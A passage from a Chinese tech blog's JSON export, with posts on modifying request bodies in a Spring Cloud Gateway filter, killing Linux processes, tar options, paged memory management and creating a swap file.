org.springframework.stereotype.Component;import org.springframework.web.reactive.function.BodyInserter;import org.springframework.web.reactive.function.BodyInserters;import org.springframework.web.reactive.function.server.ServerRequest;import org.springframework.web.server.ServerWebExchange;import reactor.core.publisher.Flux;import reactor.core.publisher.Mono;@Slf4j@Componentpublic class RequestBodyOperationFilter implements GatewayFilter, Ordered &#123; @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) &#123; ServerHttpRequest request &#x3D; exchange.getRequest(); if (request.getMethod() !&#x3D; HttpMethod.POST) &#123; return chain.filter(exchange); &#125; return operationExchange(exchange, chain); &#125; private Mono&lt;Void&gt; operationExchange(ServerWebExchange exchange, GatewayFilterChain chain) &#123; &#x2F;&#x2F; mediaType MediaType mediaType &#x3D; exchange.getRequest().getHeaders().getContentType(); &#x2F;&#x2F; read &amp; modify body ServerRequest serverRequest &#x3D; new DefaultServerRequest(exchange); Mono&lt;String&gt; modifiedBody &#x3D; serverRequest.bodyToMono(String.class) .flatMap(body -&gt; &#123; if (MediaType.APPLICATION_JSON.isCompatibleWith(mediaType)) &#123; &#x2F;&#x2F; 对原先的body进行修改操作 String newBody &#x3D; &quot;&#123;\\&quot;testName\\&quot;:\\&quot;testValue\\&quot;&#125;&quot;; return Mono.just(newBody); &#125; return Mono.empty(); &#125;); BodyInserter bodyInserter &#x3D; BodyInserters.fromPublisher(modifiedBody, String.class); HttpHeaders headers &#x3D; new HttpHeaders(); headers.putAll(exchange.getRequest().getHeaders()); headers.remove(HttpHeaders.CONTENT_LENGTH); CachedBodyOutputMessage outputMessage &#x3D; new CachedBodyOutputMessage(exchange, headers); return bodyInserter.insert(outputMessage, new BodyInserterContext()) .then(Mono.defer(() -&gt; &#123; ServerHttpRequestDecorator decorator &#x3D; new ServerHttpRequestDecorator( exchange.getRequest()) &#123; @Override public HttpHeaders getHeaders() &#123; long contentLength &#x3D; headers.getContentLength(); HttpHeaders httpHeaders &#x3D; new HttpHeaders(); httpHeaders.putAll(super.getHeaders()); if (contentLength &gt; 0) &#123; httpHeaders.setContentLength(contentLength); &#125; else &#123; httpHeaders.set(HttpHeaders.TRANSFER_ENCODING, &quot;chunked&quot;); &#125; return httpHeaders; &#125; @Override public Flux&lt;DataBuffer&gt; getBody() &#123; return outputMessage.getBody(); &#125; &#125;; return chain.filter(exchange.mutate().request(decorator).build()); &#125;)); &#125; @Override public int getOrder() &#123; return -1; &#125;&#125; 原先body会被截断的写法A： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990package cn.miao.gateway.filter;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;import io.netty.buffer.ByteBufAllocator;import lombok.extern.slf4j.Slf4j;import org.springframework.beans.factory.annotation.Value;import org.springframework.cloud.gateway.filter.GatewayFilter;import org.springframework.cloud.gateway.filter.GatewayFilterChain;import org.springframework.core.Ordered;import org.springframework.core.io.buffer.DataBuffer;import org.springframework.core.io.buffer.DataBufferUtils;import org.springframework.core.io.buffer.NettyDataBufferFactory;import org.springframework.http.HttpHeaders;import org.springframework.http.HttpMethod;import org.springframework.http.server.reactive.ServerHttpRequest;import org.springframework.http.server.reactive.ServerHttpRequestDecorator;import org.springframework.stereotype.Component;import org.springframework.web.server.ServerWebExchange;import reactor.core.publisher.Flux;import reactor.core.publisher.Mono;import java.nio.charset.Charset;@Slf4j@Componentpublic class RequestBodyOperationFilter implements GatewayFilter, Ordered &#123; @Value(&quot;$&#123;unified.request.sign.flag&#125;&quot;) private boolean signFlag; @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) &#123; ServerHttpRequest request &#x3D; exchange.getRequest(); &#x2F;&#x2F; 只拦截POST 请求 if (request.getMethod() !&#x3D; HttpMethod.POST) &#123; return chain.filter(exchange); &#125; &#x2F;&#x2F; 操作body ServerHttpRequestDecorator serverHttpRequestDecorator &#x3D; requestDecorator(exchange); return chain.filter(exchange.mutate().request(serverHttpRequestDecorator).build()); &#125; private ServerHttpRequestDecorator requestDecorator(ServerWebExchange exchange) &#123; ServerHttpRequestDecorator serverHttpRequestDecorator &#x3D; new ServerHttpRequestDecorator(exchange.getRequest()) &#123; @Override public Flux&lt;DataBuffer&gt; getBody() &#123; Flux&lt;DataBuffer&gt; body &#x3D; super.getBody(); return body.map(dataBuffer -&gt; &#123; byte[] content &#x3D; new byte[dataBuffer.readableByteCount()]; dataBuffer.read(content); &#x2F;&#x2F;释放掉内存 DataBufferUtils.release(dataBuffer); &#x2F;&#x2F;request body的json格式数据 String bodyJson &#x3D; new String(content, Charset.forName(&quot;UTF-8&quot;)); &#x2F;&#x2F;转化成json对象 JSONObject jsonObject &#x3D; JSON.parseObject(bodyJson); &#x2F;&#x2F; 对原先的body进行修改操作 jsonObject.put(&quot;testName&quot;, &quot;testValue&quot;); String result &#x3D; jsonObject.toJSONString(); &#x2F;&#x2F;转成字节 byte[] bytes &#x3D; result.getBytes(); NettyDataBufferFactory nettyDataBufferFactory &#x3D; new NettyDataBufferFactory(ByteBufAllocator.DEFAULT); DataBuffer buffer &#x3D; nettyDataBufferFactory.allocateBuffer(bytes.length); buffer.write(bytes); return buffer; &#125;); &#125; &#x2F;&#x2F;复写getHeaders方法 @Override public HttpHeaders getHeaders() &#123; HttpHeaders httpHeaders &#x3D; new HttpHeaders(); httpHeaders.putAll(super.getHeaders()); &#x2F;&#x2F;由于修改了请求体的body，导致content-length长度不确定，因此需要删除原先的content-length httpHeaders.remove(HttpHeaders.CONTENT_LENGTH); httpHeaders.set(HttpHeaders.TRANSFER_ENCODING, &quot;chunked&quot;); return httpHeaders; &#125; &#125;; return serverHttpRequestDecorator; &#125; @Override public int getOrder() &#123; return -1; &#125;&#125; 原先body会被截断的写法B： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081package cn.miao.gateway.filter;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;import io.netty.buffer.ByteBufAllocator;import lombok.extern.slf4j.Slf4j;import org.springframework.cloud.gateway.filter.GatewayFilter;import org.springframework.cloud.gateway.filter.GatewayFilterChain;import org.springframework.core.Ordered;import org.springframework.core.io.buffer.DataBuffer;import org.springframework.core.io.buffer.DataBufferUtils;import org.springframework.core.io.buffer.NettyDataBufferFactory;import org.springframework.http.HttpMethod;import org.springframework.http.server.reactive.ServerHttpRequest;import org.springframework.http.server.reactive.ServerHttpRequestDecorator;import org.springframework.stereotype.Component;import org.springframework.web.server.ServerWebExchange;import org.springframework.web.util.UriComponentsBuilder;import reactor.core.publisher.Flux;import reactor.core.publisher.Mono;import java.net.URI;import java.nio.charset.StandardCharsets;@Slf4j@Componentpublic class RequestBodyOperationFilter implements GatewayFilter, Ordered &#123; @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) &#123; ServerHttpRequest request &#x3D; exchange.getRequest(); if (request.getMethod() !&#x3D; HttpMethod.POST) &#123; return chain.filter(exchange); &#125; ServerWebExchange serverWebExchange &#x3D; requestExchange(exchange); return chain.filter(serverWebExchange); &#125; private ServerWebExchange requestExchange(ServerWebExchange exchange) &#123; ServerHttpRequest serverHttpRequest &#x3D; exchange.getRequest(); URI requestUri &#x3D; serverHttpRequest.getURI(); URI ex &#x3D; UriComponentsBuilder.fromUri(requestUri).build(true).toUri(); ServerHttpRequest newRequest &#x3D; serverHttpRequest.mutate().uri(ex).build(); &#x2F;&#x2F; 获取body内容 Flux&lt;DataBuffer&gt; body &#x3D; serverHttpRequest.getBody(); StringBuilder sb &#x3D; new StringBuilder(); body.subscribe(dataBuffer -&gt; &#123; byte[] bytes &#x3D; new byte[dataBuffer.readableByteCount()]; dataBuffer.read(bytes); DataBufferUtils.release(dataBuffer); String bodyString &#x3D; new String(bytes, StandardCharsets.UTF_8); sb.append(bodyString); &#125;); String bodyStr &#x3D; sb.toString(); &#x2F;&#x2F; 对原先的body进行修改操作 JSONObject jsonObject &#x3D; JSON.parseObject(bodyStr); jsonObject.put(&quot;testName&quot;, &quot;testValue&quot;); String result &#x3D; jsonObject.toJSONString(); &#x2F;&#x2F;转成字节 byte[] bytes &#x3D; result.getBytes(StandardCharsets.UTF_8); NettyDataBufferFactory nettyDataBufferFactory &#x3D; new NettyDataBufferFactory(ByteBufAllocator.DEFAULT); DataBuffer bodyDataBuffer &#x3D; nettyDataBufferFactory.allocateBuffer(bytes.length); bodyDataBuffer.write(bytes); Flux&lt;DataBuffer&gt; bodyFlux &#x3D; Flux.just(bodyDataBuffer); newRequest &#x3D; new ServerHttpRequestDecorator(newRequest) &#123; @Override public Flux&lt;DataBuffer&gt; getBody() &#123; return bodyFlux; &#125; &#125;; return exchange.mutate().request(newRequest).build(); &#125; @Override public int getOrder() &#123; return -1; &#125;&#125;","categories":[{"name":"java","slug":"java","permalink":"https://gschaos.club/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://gschaos.club/tags/java/"},{"name":"操作系统","slug":"操作系统","permalink":"https://gschaos.club/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"分页管理","slug":"分页管理","permalink":"https://gschaos.club/tags/%E5%88%86%E9%A1%B5%E7%AE%A1%E7%90%86/"}]},{"title":"杀死进程","slug":"killPidl","date":"2020-09-06T16:00:00.000Z","updated":"2020-10-25T08:25:10.000Z","comments":true,"path":"killPidl/","link":"","permalink":"https://gschaos.club/killPidl/","excerpt":"linux 查看某进程 并杀死进程 ps grep kill","text":"linux 查看某进程 并杀死进程 ps grep kill linux 查看某进程 并杀死进程 ps grep killLinux 中使用top 或 ps 查看进程使用kill杀死进程 1.使用top查看进程： $top 进行执行如上命令即可查看top！但是难点在如何以进程的cpu占用量进行排序呢？ cpu占用量排序执行下操作： 按大写O再按k再敲回车，然后使用R就可以以cpu占用量进行查看了！下面贴出top的技巧命令： “更改显示内容通过 f 键可以选择显示的内容。按 f 键之后会显示列的列表，按 a-z 即可显示或隐藏对应的列，最后按回车键确定。 按 o 键可以改变列的显示顺序。按小写的 a-z 可以将相应的列向右移动，而大写的 A-Z 可以将相应的列向左移动。最后按回车键确定。 按大写的 F 或 O 键，然后按 a-z 可以将进程按照相应的列进行排序。而大写的 R 键可以将当前的排序倒转。” 然后还是顶部一参数的含义： “ 150 total 进程总数2 running 正在运行的进程数148 sleeping 睡眠的进程数0 stopped 停止的进程数0 zombie 僵尸进程数Cpu0: 67.4% us 用户空间占用CPU百分比2.0% sy 内核空间占用CPU百分比0.0% ni 用户进程空间内改变过优先级的进程占用CPU百分比30.2% id 空闲CPU百分比0.0% wa 等待输入输出的CPU时间百分比0.0% hi0.0% si0.0% st 进程信息区统计信息区域的下方显示了各个进程的详细信息。首先来认识一下各列的含义。 序号 列名 含义a PID 进程idb PPID 父进程idc RUSER Real user named UID 进程所有者的用户ide USER 进程所有者的用户名f GROUP 进程所有者的组名g TTY 启动进程的终端名。不是从终端启动的进程则显示为 ?h PR 优先级i NI nice值。负值表示高优先级，正值表示低优先级j P 最后使用的CPU，仅在多CPU环境下有意义k %CPU 上次更新到现在的CPU时间占用百分比l TIME 进程使用的CPU时间总计，单位秒m TIME+ 进程使用的CPU时间总计，单位1/100秒n %MEM 进程使用的物理内存百分比o VIRT 进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RESp SWAP 进程使用的虚拟内存中，被换出的大小，单位kb。q RES 进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATAr CODE 可执行代码占用的物理内存大小，单位kbs DATA 可执行代码以外的部分(数据段+栈)占用的物理内存大小，单位kbt SHR 共享内存大小，单位kbu nFLT 页面错误次数v nDRT 最后一次写入到现在，被修改过的页面数。w S 进程状态。D=不可中断的睡眠状态R=运行S=睡眠T=跟踪/停止Z=僵尸进程x COMMAND 命令名/命令行y WCHAN 若该进程在睡眠，则显示睡眠中的系统函数名” 2.使用ps命令查看进程 $ ps -ef ……smx 1822 1 0 11:38 ? 00:00:49 gnome-terminalsmx 1823 1822 0 11:38 ? 00:00:00 gnome-pty-helpersmx 1824 1822 0 11:38 pts/0 00:00:02 bashsmx 1827 1 4 11:38 ? 00:26:28 /usr/lib/firefox-3.6.18/firefox-binsmx 1857 1822 0 11:38 pts/1 00:00:00 bashsmx 1880 1619 0 11:38 ? 00:00:00 update-notifier……smx 11946 1824 0 21:41 pts/0 00:00:00 ps -ef 或者： $ ps -aux …… smx 1822 0.1 0.8 58484 18152 ? Sl 11:38 0:49 gnome-terminalsmx 1823 0.0 0.0 1988 712 ? S 11:38 0:00 gnome-pty-helpersmx 1824 0.0 0.1 6820 3776 pts/0 Ss 11:38 0:02 bashsmx 1827 4.3 5.8 398196 119568 ? Sl 11:38 26:13 /usr/lib/firefox-3.6.18/firefox-binsmx 1857 0.0 0.1 6688 3644 pts/1 Ss 11:38 0:00 bashsmx 1880 0.0 0.6 41536 12620 ? S 11:38 0:00 update-notifier……smx 11953 0.0 0.0 2716 1064 pts/0 R+ 21:42 0:00 ps -aux 3.下面演示如何杀死进程 此时如果我想杀了火狐的进程就在终端输入： $ kill -s 9 1827 其中-s 9 制定了传递给进程的信号是９，即强制、尽快终止进程。各个终止信号及其作用见附录。 1827则是上面ps查到的火狐的PID。 简单吧，但有个问题，进程少了则无所谓，进程多了，就会觉得痛苦了，无论是ps -ef 还是ps -aux，每次都要在一大串进程信息里面查找到要杀的进程，看的眼都花了。 进阶篇： 改进１： 把ps的查询结果通过管道给grep查找包含特定字符串的进程。管道符“|”用来隔开两个命令，管道符左边命令的输出会作为管道符右边命令的输入。 $ ps -ef | grep firefoxsmx 1827 1 4 11:38 ? 00:27:33 /usr/lib/firefox-3.6.18/firefox-binsmx 12029 1824 0 21:54 pts/0 00:00:00 grep –color=auto firefox 这次就清爽了。然后就是 $kill -s 9 1827 还是嫌打字多？ 改进２——使用pgrep： 一看到pgrep首先会想到什么？没错，grep！pgrep的p表明了这个命令是专门用于进程查询的grep。 $ pgrep firefox1827 看到了什么？没错火狐的PID，接下来又要打字了： $kill -s 9 1827 改进３——使用pidof： 看到pidof想到啥？没错pid of xx，字面翻译过来就是 xx的PID。 $ pidof firefox-bin1827和pgrep相比稍显不足的是，pidof必须给出进程的全名。然后就是老生常谈： $kill -s 9 1827 无论使用ps 然后慢慢查找进程PID 还是用grep查找包含相应字符串的进程，亦或者用pgrep直接查找包含相应字符串的进程ＰＩＤ，然后手动输入给ｋｉｌｌ杀掉，都稍显麻烦。有没有更方便的方法？有！ 改进４： $ps -ef | grep firefox | grep -v grep | cut -c 9-15 | xargs kill -s 9 说明： “grep firefox”的输出结果是，所有含有关键字“firefox”的进程。 “grep -v grep”是在列出的进程中去除含有关键字“grep”的进程。 “cut -c 9-15”是截取输入行的第9个字符到第15个字符，而这正好是进程号PID。 “xargs kill -s 9”中的xargs命令是用来把前面命令的输出结果（PID）作为“kill -s 9”命令的参数，并执行该命令。“kill -s 9”会强行杀掉指定进程。 难道你不想抱怨点什么？没错太长了 改进５： 知道pgrep和pidof两个命令，干嘛还要打那么长一串！ $ pgrep firefox | xargs kill -s 9 改进６： $ ps -ef | grep firefox | awk ‘{print $2}’ | xargs kill -9kill: No such process 有一个比较郁闷的地方，进程已经正确找到并且终止了，但是执行完却提示找不到进程。 其中awk ‘{print $2}’ 的作用就是打印（print）出第二列的内容。根据常规篇，可以知道ps输出的第二列正好是PID。就把进程相应的PID通过xargs传递给kill作参数，杀掉对应的进程。 改进７： 难道每次都要调用xargs把PID传递给kill？答案是否定的： $kill -s 9 ps -aux | grep firefox | awk &#39;&#123;print $2&#125;&#39; 改进８： 没错，命令依然有点长，换成pgrep。 $kill -s 9 pgrep firefox 改进9——pkill： 看到pkill想到了什么？没错pgrep和kill！pkill＝pgrep+kill。 $pkill -９ firefox 说明：”-9” 即发送的信号是9，pkill与kill在这点的差别是：pkill无须 “ｓ”，终止信号等级直接跟在 “-“ 后面。之前我一直以为是 “-s 9”，结果每次运行都无法终止进程。 改进10——killall： killall和pkill是相似的,不过如果给出的进程名不完整，killall会报错。pkill或者pgrep只要给出进程名的一部分就可以终止进程。 $killall -9 firefox OK,讲到这里大家应该了解了吧！","categories":[{"name":"linux","slug":"linux","permalink":"https://gschaos.club/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://gschaos.club/tags/linux/"},{"name":"shell","slug":"shell","permalink":"https://gschaos.club/tags/shell/"}]},{"title":"tar压缩解压缩命令详解","slug":"tar压缩解压缩命令详解","date":"2020-09-06T16:00:00.000Z","updated":"2020-10-25T08:27:54.000Z","comments":true,"path":"tar压缩解压缩命令详解/","link":"","permalink":"https://gschaos.club/tar%E5%8E%8B%E7%BC%A9%E8%A7%A3%E5%8E%8B%E7%BC%A9%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/","excerpt":"tar压缩解压缩命令详解","text":"tar压缩解压缩命令详解 tar压缩解压缩命令详解tar命令详解 -c: 建立压缩档案 -x：解压 -t：查看内容 -r：向压缩归档文件末尾追加文件 -u：更新原压缩包中的文件 这五个是独立的命令，压缩解压都要用到其中一个，可以和别的命令连用但只能用其中一个。 下面的参数是根据需要在压缩或解压档案时可选的。 -z：有gzip属性的 -j：有bz2属性的 -Z：有compress属性的 -v：显示所有过程 -O：将文件解开到标准输出 参数-f是必须的 -f: 使用档案名字，切记，这个参数是最后一个参数，后面只能接档案名。 # tar -cf all.tar *.jpg 这条命令是将所有.jpg的文件打成一个名为all.tar的包。-c是表示产生新的包，-f指定包的文件名。# tar -rf all.tar *.gif 这条命令是将所有.gif的文件增加到all.tar的包里面去。-r是表示增加文件的意思。# tar -uf all.tar logo.gif 这条命令是更新原来tar包all.tar中logo.gif文件，-u是表示更新文件的意思。# tar -tf all.tar 这条命令是列出all.tar包中所有文件，-t是列出文件的意思# tar -xf all.tar 这条命令是解出all.tar包中所有文件，-x是解开的意思 查看tar -tf aaa.tar.gz 在不解压的情况下查看压缩包的内容 压缩 tar –cvf jpg.tar *.jpg //将目录里所有jpg文件打包成tar.jpg tar –czf jpg.tar.gz *.jpg //将目录里所有jpg文件打包成jpg.tar后，并且将其用gzip压缩，生成一个gzip压缩过的包，命名为jpg.tar.gz tar –cjf jpg.tar.bz2 *.jpg //将目录里所有jpg文件打包成jpg.tar后，并且将其用bzip2压缩，生成一个bzip2压缩过的包，命名为jpg.tar.bz2 tar –cZf jpg.tar.Z *.jpg //将目录里所有jpg文件打包成jpg.tar后，并且将其用compress压缩，生成一个umcompress压缩过的包，命名为jpg.tar.Z 解压 tar –xvf file.tar //解压 tar包 tar -xzvf file.tar.gz //解压tar.gz tar -xjvf file.tar.bz2 //解压 tar.bz2tar –xZvf file.tar.Z //解压tar.Z 总结 1、*.tar 用 tar –xvf 解压 2、*.gz 用 gzip -d或者gunzip 解压 3、*.tar.gz和*.tgz 用 tar –xzf 解压 4、*.bz2 用 bzip2 -d或者用bunzip2 解压 5、*.tar.bz2用tar –xjf 解压 6、*.Z 用 uncompress 解压 7、*.tar.Z 用tar –xZf 解压","categories":[{"name":"linux","slug":"linux","permalink":"https://gschaos.club/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://gschaos.club/tags/linux/"},{"name":"shell","slug":"shell","permalink":"https://gschaos.club/tags/shell/"}]},{"title":"分页存储管理的基本原理","slug":"分页存储管理的基本原理","date":"2020-09-06T16:00:00.000Z","updated":"2020-10-25T08:29:09.000Z","comments":true,"path":"分页存储管理的基本原理/","link":"","permalink":"https://gschaos.club/%E5%88%86%E9%A1%B5%E5%AD%98%E5%82%A8%E7%AE%A1%E7%90%86%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/","excerpt":"","text":"逻辑地址和物理地址 逻辑地址。用户源程序经编译、链接后得到可装入程序。由于无法预先知道程序装入内存的具体位置，因此不可能在程序中直接使用内存地址，只能暂定程序的起始地址为 0。这样，程序中指令和数据的地址都是相对 0 这个起始地址进行计算的，按照这种方法确定的地址称为逻辑地址或相对地址。一般情况下，目标模块（程序）和装入模块（程序）中的地址都是逻辑地址。 逻辑地址空间。一个目标模块（程序）或装入模块（程序）的所有逻辑地址的集合，称为逻辑地址空间或相对地址空间。 物理地址。内存中实际存储单元的地址称为物理地址，物理地址也称为绝对地址或内存地址。为了使程序装入内存后能够正常运行，就必须将程序代码中的逻辑地址转换为物理地址，这个转换操作称为地址转换。 物理地址空间。内存中全部存储单元的物理地址集合称为物理地址空间、绝对地址空间或内存地址空间。由于每个内存单元都有唯一的内存地址编号，因此物理地址空间是一个一维的线性空间。要使装入内存的程序后能够正常运行、互不干扰，就必须将不同程序装入到内存空间的不同区域。 虚拟地址空间。CPU 支持的地址范围一般远大于机器实际内存的大小，对于多出来的那部分地址（没有对应的实际内存）程序仍然可能使用，我们将程序能够使用的整个地址范围称为虚拟地址空间。如 Windows XP 采用 32 位地址结构，每个用户进程的虚拟地址空间为 4GB（232），但可能实际内存只有 2GB。虚拟地址空间中的某个地址称为虚拟地址，而用户进程的虚拟地址就是前面所说的逻辑地址。 分页存储管理的基本原理1．实现原理在分页存储管理中，一个程序的逻辑地址空间被划分成若干个大小相等的区域，每个区域称为页或页面，并且程序地址空间中所有的页从 0 开始顺序编号。相应地，内存物理地址空间也按同样方式划分成与页大小相同的区域，每个区域称为物理块或页框，与页一样内存空间中的所有物理块也从 0 开始顺序编号。在为程序分配内存时，允许以页为单位将程序的各个页，分别装入内存中相邻或不相邻的物理块中。由于程序的最后一页往往不能装满分配给它的物理块，于是会有一定程度的内存空间浪费，这部分被浪费的内存空间称为页内碎片。 分页系统中页的选择对系统性能有重要影响。若页划分得过小，虽然可以有效减少页内碎片，并提高内存利用率，但会导致每个进程需要更多的页，这样会使分页系统中用于页管理的页表增大，而占用更多的内存空间。若页划分得过大，虽然可以减少页表大小，并提高页的置换速度，但会导致页内碎片增大，而且当一个页大到能装下一个程序时就退化为分区存储管理了。因此页的大小应适中，分页系统中页的大小取决于机器的地址结构，一般设置为 2 的整数幂，通常为 512B～8KB。 2．逻辑地址结构在分页存储管理中，程序中的逻辑地址被转换为页号和页内地址。这个转换工作在程序执行时由系统硬件自动完成，整个过程对用户透明。因此用户编程时不需要知道逻辑地址与页号和页内地址的对应关系，只需要使用一维的逻辑地址。 程序的一维逻辑地址空间经过系统硬件自动分页后，形成「页号 + 页内地址」的地址结构。在图 所示的地址结构中，逻辑地址通过页号和页内地址来共同表示。其中，0～11 位是页内地址，即每个页的大小是 4KB；12～31 位是页号，即地址空间最多允许有 1M 个页。一维逻辑地址与页号和页内地址的关系是（注：页长即一页的大小） 一维逻辑地址 = 页号 × 页长 + 页内地址 3．数据结构为了实现分页存储管理，系统主要设置了以下两种表格。 （1）页表 在分页系统中，允许程序所有的页以离散方式分别存储在内存不同的物理块里，为了使程序能够正确运行，必须在内存空间中找到存放每个页的物理块。因此操作系统为每个程序（进程）建立了一张页映射表，简称页表（Page Table），用来存储页号及其映射（装入）的内存物理块号。最简单的页表由页号及其映射的物理块号组成。由于页表的长度由程序所拥有页的个数决定，故每个程序的页表长度通常不同。 （2）内存分配表 为了正确地将一个页装入到内存的某一物理块中，就必须知道内存中所有物理块的使用情况，因此系统建立一张内存分配表来记录内存中物理块的分配情况。由于每个物理块的大小相同且不会改变大小，因此最简单的办法是用一张位示图（Bitmap）来构成内存分配表。位示图是指在内存中开辟若干个字，它的每一位与内存中的一个物理块相对应。每一位的值可以是 0 或 1，当取值为 0 时，表示对应的物理块空闲；当取值为 1 时，表示对应的物理块已分配。此外，在位示图中增加一个字节，来记录内存当前空闲物理块的总数。 4. 地址保护 基本地址转换 在分页存储管理中,系统为每个程序建立了一张页表并存放于内存中 当程序被装入内存但尚未运行时,页表始址(页表在内存中的起始地址)和页表长度(程序逻辑地址空间从页号 0 开始划分出的最大页号)等信息被保存到为该程序(进程)创建的 PCB 中,或保存到请求表中 一旦进程调度程序调度该进程运行时,其 PCB 中保存的页表始址和页表长度信息(或请求表中这两个的信息)便被装入到页表控制寄存器中,基本地址转换过程如图 所示 从基本地址转换过程可知 物理地址 = 物理块号 页长 + 页内地址,由于页表驻留在内存,因此当 CPU 依据指令中的逻辑地址进行操作时,至少要两次访问内存 为了提高地址转换的速度,一种行之有效的方法是在地址转换机构中,增加一个具备并行查找能力的高速缓冲寄存器,又称联想存储器(Associative Memory)来构成一张快表,快表中保存着当前运行进程最常用的页号及其映射的物理块号 具有快表的地址转换 在快表中查找和在内存中查找是同时进行的,只不过在内存页表中查找的速度要慢一些,当快表中找到含有该页号的页表项时,则终止内存页表的查找。 由于成本的关系,快表不可能做得很大,通常只存放 32~1024 个页表项 据统计,从快表中能找到所需页表项的概率可达 90% 以上。 页的保护 页的保护分为两个方面:一是在逻辑地址转换成物理地址时的保护,通过页号与页表长度的比较防止地址越界;二是在实现信息共享时,对共享信息的保护 通常是在页表中增加一些标志位来设置存取控制字段,一般设置只读 读写 读和执行等权限 如果某进程试图去执行一个只允许读的内存物理块,系统就会发出访问性中断。","categories":[{"name":"java","slug":"java","permalink":"https://gschaos.club/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://gschaos.club/tags/java/"},{"name":"操作系统","slug":"操作系统","permalink":"https://gschaos.club/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"分页管理","slug":"分页管理","permalink":"https://gschaos.club/tags/%E5%88%86%E9%A1%B5%E7%AE%A1%E7%90%86/"}]},{"title":"Linux设置虚拟内存","slug":"Linux设置虚拟内存","date":"2020-08-27T16:00:00.000Z","updated":"2020-10-25T08:25:23.000Z","comments":true,"path":"Linux设置虚拟内存/","link":"","permalink":"https://gschaos.club/Linux%E8%AE%BE%E7%BD%AE%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/","excerpt":"在我们自己的购买的服务器环境中，一般是买的1g的内存，但是当服务器里面的东西装的比较多的时候就会导致内存不够用了,这个时候可以通过增加虚拟内存来夸大内存容量。","text":"在我们自己的购买的服务器环境中，一般是买的1g的内存，但是当服务器里面的东西装的比较多的时候就会导致内存不够用了,这个时候可以通过增加虚拟内存来夸大内存容量。 Linux设置虚拟内存交换技术交换（Swapping）技术它的主要特点是：打破了一个程序一旦进入内存，就一直驻留在内存直到运行结束的限制。 在多道程序环境下，内存中可以同时存在多个进程（程序），其中的一部分进程由于等待某些事件而处于阻塞状态，但这些处于阻塞状态的进程仍然驻留内存，并占据着内存空间；另一方面，外存上可能有许多等待装入内存运行的程序，却因内存不足而未能装入。显然，这是一种严重的系统资源浪费，它会使系统的吞吐量下降。为了解决这个问题，可以在操作系统中增加交换（对换）功能，即由操作系统根据需要，将内存中暂时不具备运行条件的部分程序或数据移到外存（换出），以便腾出足够的内存空间，将外存中需要运行的程序或数据调入内存（换入）投入运行。在操作系统中引入交换（对换）技术，可以显著提高内存资源的利用率并改善系统的性能。 以交换的单位不同来划分，则有以下两种交换方式。 以进程为单位的交换。每次换入/换出的是整个进程，我们称这种交换为进程交换（进程对换）或整体交换（整体对换）。进程交换广泛应用于分时系统，主要解决内存紧张问题。 以页（此处不多做介绍）或段（此处不多做介绍）为单位的交换。这种交换分别称为页置换（页交换或页对换）或段置换（段交换或段对换），页置换和段置换是以进程中的某一部分为交换单位，因此又称为部分交换（部分对换）。部分交换广泛应用于现代操作系统中，是实现虚拟存储器的基础。 我们这里所说的交换是指进程交换，为了实现进程交换，操作系统需要解决以下两个问题。 对换空间的管理。在具有交换功能的操作系统中，一般将外存空间分为文件区和交换区（对换区）。文件区用来存放文件，而交换区则用来存放从内存中换出的进程，或等待换入内存的进程。尽管文件区一般采用离散分配方式来分配外存存储空间，但交换区的存储空间分配则宜采用连续分配方式，这是因为交换区中存放的是换入/换出的进程，为了提高交换速度，有必要采用连续分配方式，并且交换区可以采用与可变分区存储管理类似的方法进行管理。例如，使用空闲分区表或空闲分区链来记录外存交换区的使用情况，利用首次适应算法、最佳适应算法或最差适应算法来进行外存交换区的分配。 交换的时机以及选择哪些进程交换。交换时机一般选择在进程的时间片用完，以及进程等待输入/输出时，或者在进程要求扩充其内存空间而得不到满足时。换出到外存的进程一般选择处于阻塞状态，或优先级低且短时间内不会再次投入运行的进程；换入到内存的进程则应选择换出时间最久且已处于就绪状态的进程。 《操作系统原理》 介绍在我们自己的购买的服务器环境中，一般是买的1g的内存，但是当服务器里面的东西装的比较多的时候就会导致内存不够用了 创建swap文件 进入/usr目录 1234[root@localhost usr]$ pwd/usr[root@localhost usr]$ 创建swap文件夹,并进入该文件夹 123456[root@localhost usr]# mkdir swap[root@localhost usr]# cd swap/[root@localhost swap]# pwd/usr/swap[root@localhost swap]# 创建swapfile文件,使用命令dd if=/dev/zero of=/usr/swap/swapfile bs=1M count=4096 12345[root@localhost swap]# dd if=/dev/zero of=/usr/swap/swapfile bs=1M count=4096记录了4096+0 的读入记录了4096+0 的写出4294967296字节(4.3 GB)已复制，15.7479 秒，273 MB/秒[root@localhost swap]# 查看swap文件 使用命令du -sh /usr/swap/swapfile,可以看到我们创建的这个swap文件为4g 123[root@localhost swap]# du -sh /usr/swap/swapfile4.1G /usr/swap/swapfile[root@localhost swap]# 将目标设置为swap分区文件 使用命令mkswap /usr/swap/swapfile将swapfile文件设置为swap分区文件 123456[root@localhost swap]# mkswap /usr/swap/swapfilemkswap: /usr/swap/swapfile: warning: don&#x27;t erase bootbits sectors on whole disk. Use -f to force.Setting up swapspace version 1, size = 4194300 KiBno label, UUID=5bd241ff-5375-449d-9975-5fdd429df784[root@localhost swap]# 激活swap区，并立即启用交换区文件 使用命令swapon /usr/swap/swapfile 12[root@localhost swap]# swapon /usr/swap/swapfile[root@localhost swap]# 使用命令free -m 